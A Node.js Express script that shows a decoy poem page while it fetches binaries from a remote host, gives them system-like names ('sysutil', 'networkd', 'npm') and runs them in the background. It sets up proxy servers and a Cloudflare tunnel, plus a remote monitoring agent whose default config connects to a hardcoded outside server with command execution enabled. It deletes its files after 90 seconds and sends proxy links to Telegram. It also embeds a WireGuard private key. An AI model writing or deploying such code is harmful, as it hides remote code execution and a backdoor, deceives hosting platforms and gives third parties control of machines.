const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');
const UPLOAD_URL = process.env.UPLOAD_URL || '';
const PROJECT_URL = process.env.PROJECT_URL || '';
const AUTO_ACCESS = process.env.AUTO_ACCESS || false;
const FILE_PATH = process.env.FILE_PATH || './.npm';
const SUB_PATH = process.env.SUB_PATH || 'sub123';
const KEY = process.env.KEY || '161fc0b2-cfa3-4053-8d51-20aeee66c2dd';
const WUKONG_SERVER = process.env.WUKONG_SERVER || 'kcystufkiiuc.ap-northeast-1.clawcloudrun.com:443';
const WUKONG_PORT = process.env.WUKONG_PORT || '';
const WUKONG_KEY = process.env.WUKONG_KEY || '2h1TEmM79EPLBctbNrd014hWlkZ3Sr26';
const CLOUD_DOMAIN = process.env.CLOUD_DOMAIN || '';
const CLOUD_TOKEN = process.env.CLOUD_TOKEN || '';
const CLOUD_PORT = process.env.CLOUD_PORT || 8001;
const TUIC_PORT = process.env.TUIC_PORT || 40000;
const HY2_PORT = process.env.HY2_PORT || 50000;
const REALITY_PORT = process.env.REALITY_PORT || 60000;
const CFIP = process.env.CFIP || 'skk.moe';
const CFPORT = process.env.CFPORT || 443;
const PORT = process.env.PORT || 3000;
const NAME = process.env.NAME || 'Vl';
const CHAT_ID = process.env.CHAT_ID || '';
const BOT_TOKEN = process.env.BOT_TOKEN || '';

//创建运行文件夹
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

let privateKey = '';
let publicKey = '';
let npmPath = path.join(FILE_PATH, 'npm');
let wukongPath = path.join(FILE_PATH, 'wukong');
let sysutilPath = path.join(FILE_PATH, 'sysutil');
let networkdPath = path.join(FILE_PATH, 'networkd');
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');

function deleteNodes() {
  try {
    if (!UPLOAD_URL) return;

    const subPath = path.join(FILE_PATH, 'sub.txt');
    if (!fs.existsSync(subPath)) return;

    let fileContent;
    try {
      fileContent = fs.readFileSync(subPath, 'utf-8');
    } catch {
      return null;
    }

    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line => 
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line)
    );

    if (nodes.length === 0) return;

    return axios.post(`${UPLOAD_URL}/api/delete-nodes`, 
      JSON.stringify({ nodes }),
      { headers: { 'Content-Type': 'application/json' } }
    ).catch((error) => { 
      return null; 
    });
  } catch (err) {
    return null;
  }
}

//清理历史文件
const pathsToDelete = [ 'sysutil', 'networkd', 'npm', 'wukong', 'boot.log', 'list.txt'];
function cleanupOldFiles() {
  pathsToDelete.forEach(file => {
    const filePath = path.join(FILE_PATH, file);
    fs.unlink(filePath, () => {});
  });
}
cleanupOldFiles();

// 根路由
app.get("/", function(req, res) {
  const poem = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>A Moment of Reflection</title>
    <style>
        body { font-family: serif; background-color: #f0f2f5; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        pre { font-size: 1.2em; line-height: 1.7; white-space: pre-wrap; padding: 2em; background: #fff; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
    </style>
</head>
<body>
    <pre>
The river flows, a silver thread,
Reflecting skies above your head.

Each drop a choice, each turn a test,
To find the sea and be at rest.

Not in the end, but in the ride,
Is where the truest currents hide.
    </pre>
</body>
</html>
  `;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(poem);
});


// 判断系统架构
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的依赖文件
function downloadFile(fileName, fileUrl, callback) {
  const filePath = path.join(FILE_PATH, fileName);
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(`Download ${fileName} successfully`);
        callback(null, fileName);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${fileName} failed: ${err.message}`;
        console.error(errorMessage); // 下载失败时输出错误消息
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${fileName} failed: ${err.message}`;
      console.error(errorMessage); // 下载失败时输出错误消息
      callback(errorMessage);
    });
}

// 下载并运行依赖文件
async function downloadFilesAndRun() {
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
        if (err) {
          reject(err);
        } else {
          resolve(fileName);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises); // 等待所有文件下载完成
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }

  // 授权文件
  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(relativeFilePath => {
      const absoluteFilePath = path.join(FILE_PATH, relativeFilePath);
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {
          if (err) {
            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
          } else {
            console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
          }
        });
      }
    });
  }
  const filesToAuthorize = WUKONG_PORT ? ['./npm', './sysutil', './networkd'] : ['./wukong', './sysutil', './networkd'];
  authorizeFiles(filesToAuthorize);

  //运行悟空
  if (WUKONG_SERVER && WUKONG_KEY) {
    if (!WUKONG_PORT) {
      // 检测悟空是否开启TLS
      const port = WUKONG_SERVER.includes(':') ? WUKONG_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const wukongtls = tlsPorts.has(port) ? 'true' : 'false';
      // 生成 config.yaml
      const configYaml = `
client_secret: ${WUKONG_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: ${WUKONG_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: ${wukongtls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${KEY}`;
      
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
    }
  }
  
  // 生成 reality-keypair
  exec(`${path.join(FILE_PATH, 'sysutil')} generate reality-keypair`, async (err, stdout, stderr) => {
    if (err) {
      console.error(`Error generating reality-keypair: ${err.message}`);
      return;
    }
    // 提取 private_key 和 public_key
    const privateKeyMatch = stdout.match(/PrivateKey:\s*(.*)/);
    const publicKeyMatch = stdout.match(/PublicKey:\s*(.*)/);

    privateKey = privateKeyMatch ? privateKeyMatch[1] : '';
    publicKey = publicKeyMatch ? publicKeyMatch[1] : ''; // 赋值给全局变量

    if (!privateKey || !publicKey) {
      console.error('Failed to extract privateKey or publicKey from output.');
      return;
    }

    console.log('Private Key:', privateKey);
    console.log('Public Key:', publicKey);

    // 生成 private.key 文件
    exec('openssl ecparam -genkey -name prime256v1 -out "private.key"', (err, stdout, stderr) => {
      if (err) {
        console.error(`Error generating private.key: ${err.message}`);
        return;
      }
    // console.log('private.key has been generated successfully.');

      // 生成 cert.pem 文件
      exec('openssl req -new -x509 -days 3650 -key "private.key" -out "cert.pem" -subj "/CN=bing.com"', async (err, stdout, stderr) => {
        if (err) {
          console.error(`Error generating cert.pem: ${err.message}`);
          return;
        }
      // console.log('cert.pem has been generated successfully.');

        // 确保 privateKey 和 publicKey 已经被正确赋值
        if (!privateKey || !publicKey) {
          console.error('PrivateKey or PublicKey is missing, retrying...');
          return;
        }

        // 生成sb配置文件
        const config = {
          "log": {
            "disabled": true,
            "level": "info",
            "timestamp": true
          },
          "dns": {
            "servers": [
              {
                "address": "8.8.8.8",
                "address_resolver": "local"
              },
              {
                "tag": "local",
                "address": "local"
              }
            ]
          },
          "inbounds": [
            {
              "tag": "vmess-ws-in",
              "type": "vmess",
              "listen": "::",
              "listen_port": CLOUD_PORT,
              "users": [
                {
                  "uuid": KEY
                }
              ],
              "transport": {
                "type": "ws",
                "path": "/vmess-argo",
                "early_data_header_name": "Sec-WebSocket-Protocol"
              }
            },
            {
              "tag": "vless-in",
              "type": "vless",
              "listen": "::",
              "listen_port": REALITY_PORT,
              "users": [
                {
                  "uuid": KEY,
                  "flow": "xtls-rprx-vision"
                }
              ],
              "tls": {
                "enabled": true,
                "server_name": "www.iij.ad.jp",
                "reality": {
                  "enabled": true,
                  "handshake": {
                    "server": "www.iij.ad.jp",
                    "server_port": 443
                  },
                  "private_key": privateKey, 
                  "short_id": [""]
                }
              }
            },
            {
              "tag": "hysteria-in",
              "type": "hysteria2",
              "listen": "::",
              "listen_port": HY2_PORT,
              "users": [
                {
                  "password": KEY
                }
              ],
              "masquerade": "https://bing.com",
              "tls": {
                "enabled": true,
                "alpn": ["h3"],
                "certificate_path": "cert.pem",
                "key_path": "private.key"
              }
            },
            {
              "tag": "tuic-in",
              "type": "tuic",
              "listen": "::",
              "listen_port": TUIC_PORT,
              "users": [
                {
                  "uuid": KEY
                }
              ],
              "congestion_control": "bbr",
              "tls": {
                "enabled": true,
                "alpn": ["h3"],
                "certificate_path": "cert.pem",
                "key_path": "private.key"
              }
            }
          ],
          "outbounds": [
            {
              "type": "direct",
              "tag": "direct"
            },
            {
              "type": "block",
              "tag": "block"
            },
            {
              "type": "wireguard",
              "tag": "wireguard-out",
              "server": "162.159.195.100",
              "server_port": 4500,
              "local_address": [
                "172.16.0.2/32",
                "2606:4700:110:83c7:b31f:5858:b3a8:c6b1/128"
              ],
              "private_key": "mPZo+V9qlrMGCZ7+E6z2NI6NOV34PD++TpAR09PtCWI=",
              "peer_public_key": "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=",
              "reserved": [26, 21, 228]
            }
          ],
          "route": {
            "rule_set": [
              {
                "tag": "netflix",
                "type": "remote",
                "format": "binary",
                "url": "https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-netflix.srs",
                "download_detour": "direct"
              },
              {
                "tag": "openai",
                "type": "remote",
                "format": "binary",
                "url": "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs",
                "download_detour": "direct"
              }
            ],
            "rules": [
              {
                "rule_set": ["openai", "netflix"],
                "outbound": "wireguard-out"
              }
            ],
            "final": "direct"
          }
        };
        fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));

        // 运行悟空
        let WUKONG_TLS = '';
        if (WUKONG_SERVER && WUKONG_PORT && WUKONG_KEY) {
          const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
          if (tlsPorts.includes(WUKONG_PORT)) {
            WUKONG_TLS = '--tls';
          } else {
            WUKONG_TLS = '';
          }
          const command = `nohup ${path.join(FILE_PATH, 'npm')} -s ${WUKONG_SERVER}:${WUKONG_PORT} -p ${WUKONG_KEY} ${WUKONG_TLS} >/dev/null 2>&1 &`;
          try {
            await execPromise(command);
            console.log('npm is running');
            await new Promise((resolve) => setTimeout(resolve, 1000));
          } catch (error) {
            console.error(`npm running error: ${error}`);
          }
        } else if (WUKONG_SERVER && WUKONG_KEY) {
            // 运行 V1
            const command = `nohup ${wukongPath} -c "${path.join(FILE_PATH, 'config.yaml')}" >/dev/null 2>&1 &`;
            try {
              await exec(command);
              console.log('wukong is running');
              await new Promise((resolve) => setTimeout(resolve, 1000));
            } catch (error) {
              console.error(`wukong running error: ${error}`);
            }
        } else {
          console.log('WUKONG variable is empty, skipping running');
        }

        // 运行sysutil
        const command1 = `nohup ${sysutilPath} run -c ${path.join(FILE_PATH, 'config.json')} >/dev/null 2>&1 &`;
        try {
          await execPromise(command1);
          console.log('sysutil is running');
          await new Promise((resolve) => setTimeout(resolve, 1000));
        } catch (error) {
          console.error(`sysutil running error: ${error}`);
        }

        // 运行networkd
        if (fs.existsSync(networkdPath)) {
          let args;

          if (CLOUD_TOKEN.match(/^[A-Z0-9a-z=]{120,250}$/)) {
            args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${CLOUD_TOKEN}`;
          } else if (CLOUD_TOKEN.match(/TunnelSecret/)) {
            args = `tunnel --edge-ip-version auto --config ${path.join(FILE_PATH, 'tunnel.yml')} run`;
          } else {
            args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${bootLogPath} --loglevel info --url http://localhost:${CLOUD_PORT}`;
          }

          try {
            await execPromise(`nohup ${networkdPath} ${args} >/dev/null 2>&1 &`);
            console.log('networkd is running');
            await new Promise((resolve) => setTimeout(resolve, 2000));
          } catch (error) {
            console.error(`Error executing command: ${error}`);
          }
        }
        await new Promise((resolve) => setTimeout(resolve, 5000));

        // 提取域名并生成sub.txt文件
        await extractDomains();
      });
    });
  });
}

// 执行命令的Promise封装
function execPromise(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout || stderr);
      }
    });
  });
}

// 根据系统架构返回对应的url
function getFilesForArchitecture(architecture) {
  let baseFiles;
  if (architecture === 'arm') {
    baseFiles = [
      { fileName: "sysutil", fileUrl: "https://arm64.ssss.nyc.mn/sb" },
      { fileName: "networkd", fileUrl: "https://arm64.ssss.nyc.mn/2go" }
    ];
  } else {
    baseFiles = [
      { fileName: "sysutil", fileUrl: "https://amd64.ssss.nyc.mn/sb" },
      { fileName: "networkd", fileUrl: "https://amd64.ssss.nyc.mn/2go" }
    ];
  }

  if (WUKONG_SERVER && WUKONG_KEY) {
    if (WUKONG_PORT) {
      const npmUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/agent"
        : "https://amd64.ssss.nyc.mn/agent";
        baseFiles.unshift({ 
          fileName: "npm", 
          fileUrl: npmUrl 
        });
    } else {
      const phpUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/v1" 
        : "https://amd64.ssss.nyc.mn/v1";
      baseFiles.unshift({ 
        fileName: "wukong", 
        fileUrl: phpUrl
      });
    }
  }

  return baseFiles;
}

// 获取固定隧道json
function argoType() {
  if (!CLOUD_TOKEN || !CLOUD_DOMAIN) {
    console.log("CLOUD_DOMAIN or CLOUD_TOKEN variable is empty, use quick tunnels");
    return;
  }

  if (CLOUD_TOKEN.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), CLOUD_TOKEN);
    const tunnelYaml = `
  tunnel: ${CLOUD_TOKEN.split('"')[11]}
  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2
  
  ingress:
    - hostname: ${CLOUD_DOMAIN}
      service: http://localhost:${CLOUD_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  } else {
    console.log("CLOUD_TOKEN mismatch TunnelSecret,use token connect to tunnel");
  }
}
argoType();

// 获取临时隧道domain
async function extractDomains() {
  let argoDomain;

  if (CLOUD_TOKEN && CLOUD_DOMAIN) {
    argoDomain = CLOUD_DOMAIN;
    console.log('CLOUD_DOMAIN:', argoDomain);
    await generateLinks(argoDomain);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        console.log('ArgoDomain:', argoDomain);
        await generateLinks(argoDomain);
      } else {
        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
          // 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain
          fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
          async function killBotProcess() {
            try {
              await exec('pkill -f "[n]etworkd" > /dev/null 2>&1');
            } catch (error) {
                return null;
              // 忽略输出
            }
          }
          killBotProcess();
          await new Promise((resolve) => setTimeout(resolve, 1000));
          const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${bootLogPath} --loglevel info --url http://localhost:${CLOUD_PORT}`;
          try {
            await exec(`nohup ${networkdPath} ${args} >/dev/null 2>&1 &`);
            console.log('networkd is running.');
            await new Promise((resolve) => setTimeout(resolve, 6000)); // 等待6秒
            await extractDomains(); // 重新提取域名
          } catch (error) {
            console.error(`Error executing command: ${error}`);
          }
        }
      } catch (error) {
        console.error('Error reading boot.log:', error);
      }
    }
  
  // 生成 list 和 sub 信息
  async function generateLinks(argoDomain) {
    let SERVER_IP = '';
    try {
      SERVER_IP = execSync('curl -s --max-time 2 ipv4.ip.sb').toString().trim();
    } catch (err) {
      try {
        SERVER_IP = `[${execSync('curl -s --max-time 1 ipv6.ip.sb').toString().trim()}]`;
      } catch (ipv6Err) {
        console.error('Failed to get IP address:', ipv6Err.message);
      }
    }

    const metaInfo = execSync(
      'curl -s https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
      { encoding: 'utf-8' }
    );
    const ISP = metaInfo.trim();

    return new Promise((resolve) => {
      setTimeout(() => {
        const vmessNode = `vmess://${Buffer.from(JSON.stringify({ v: '2', ps: `${NAME}-${ISP}`, add: CFIP, port: CFPORT, id: KEY, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2048', tls: 'tls', sni: argoDomain, alpn: '' })).toString('base64')}`;

        let subTxt = vmessNode; // 始终生成vmess节点

        // 根据端口生成其他节点
        if (TUIC_PORT !== 40000) {
          const tuicNode = `\ntuic://${KEY}:@${SERVER_IP}:${TUIC_PORT}?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#${NAME}-${ISP}`;
          subTxt += tuicNode; // 添加tuic节点
        }

        if (HY2_PORT !== 50000) {
          const hysteriaNode = `\nhysteria2://${KEY}@${SERVER_IP}:${HY2_PORT}/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#${NAME}-${ISP}`;
          subTxt += hysteriaNode; // 添加hysteria节点
        }

        if (REALITY_PORT !== 60000) {
          const vlessNode = `\nvless://${KEY}@${SERVER_IP}:${REALITY_PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=chrome&pbk=${publicKey}&type=tcp&headerType=none#${NAME}-${ISP}`;
          subTxt += vlessNode; // 添加vless节点
        }

        // 打印 sub.txt 内容到控制台
        console.log(Buffer.from(subTxt).toString('base64')); 
        fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
        fs.writeFileSync(listPath, subTxt, 'utf8');
        console.log(`${FILE_PATH}/sub.txt saved successfully`);
        sendTelegram(); // 发送tg消息提醒
        uplodNodes(); // 推送节点到订阅器
        // 将内容进行 base64 编码并写入 SUB_PATH 路由
        app.get(`/${SUB_PATH}`, (req, res) => {
          const encodedContent = Buffer.from(subTxt).toString('base64');
          res.set('Content-Type', 'text/plain; charset=utf-8');
          res.send(encodedContent);
        });
        resolve(subTxt);
      }, 2000);
    });
  }
}
  
// 90s分钟后删除相关文件
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, listPath, sysutilPath, networkdPath, wukongPath, npmPath];  
    
    if (WUKONG_PORT) {
      filesToDelete.push(npmPath);
    } else if (WUKONG_SERVER && WUKONG_KEY) {
      filesToDelete.push(wukongPath);
    }

    exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, (error) => {
      console.clear();
      console.log('App is running');
      console.log('Thank you for using this script, enjoy!');
    });
  }, 90000); // 90s
}

async function sendTelegram() {
  if (!BOT_TOKEN || !CHAT_ID) {
      console.log('TG variables is empty,Skipping push nodes to TG');
      return;
  }
  try {
      const message = fs.readFileSync(path.join(FILE_PATH, 'sub.txt'), 'utf8');
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      
      const escapedName = NAME.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
      
      const params = {
          chat_id: CHAT_ID,
          text: `**${escapedName}节点推送通知**\n\`\`\`${message}\`\`\``,
          parse_mode: 'MarkdownV2'
      };

      await axios.post(url, null, { params });
      console.log('Telegram message sent successfully');
  } catch (error) {
      console.error('Failed to send Telegram message', error);
  }
}

async function uplodNodes() {
  if (UPLOAD_URL && PROJECT_URL) {
    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
    const jsonData = {
      subscription: [subscriptionUrl]
    };
    try {
        const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (response.status === 200) {
            console.log('Subscription uploaded successfully');
        } else {
          return null;
          //  console.log('Unknown response status');
        }
    } catch (error) {
        if (error.response) {
            if (error.response.status === 400) {
              //  console.error('Subscription already exists');
            }
        }
    }
  } else if (UPLOAD_URL) {
      if (!fs.existsSync(listPath)) return;
      const content = fs.readFileSync(listPath, 'utf-8');
      const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));

      if (nodes.length === 0) return;

      const jsonData = JSON.stringify({ nodes });

      try {
          await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
              headers: { 'Content-Type': 'application/json' }
          });
          if (response.status === 200) {
            console.log('Subscription uploaded successfully');
        } else {
            return null;
        }
      } catch (error) {
          return null;
      }
  } else {
      // console.log('Skipping upload nodes');
      return;
  }
}

// 自动访问项目URL
async function AddVisitTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console.log("Skipping adding automatic access task");
    return;
  }

  try {
    const response = await axios.post('https://keep.gvrander.eu.org/add-url', {
      url: PROJECT_URL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    // console.log(`${JSON.stringify(response.data)}`);
    console.log('automatic access task added successfully');
  } catch (error) {
    console.error(`添加URL失败: ${error.message}`);
  }
}

// 运行服务
async function startserver() {
  deleteNodes();
  cleanupOldFiles();
  await downloadFilesAndRun();
  AddVisitTask();
  cleanFiles();
}
startserver();
  
app.listen(PORT, () => console.log(`server is running on port:${PORT}!`));
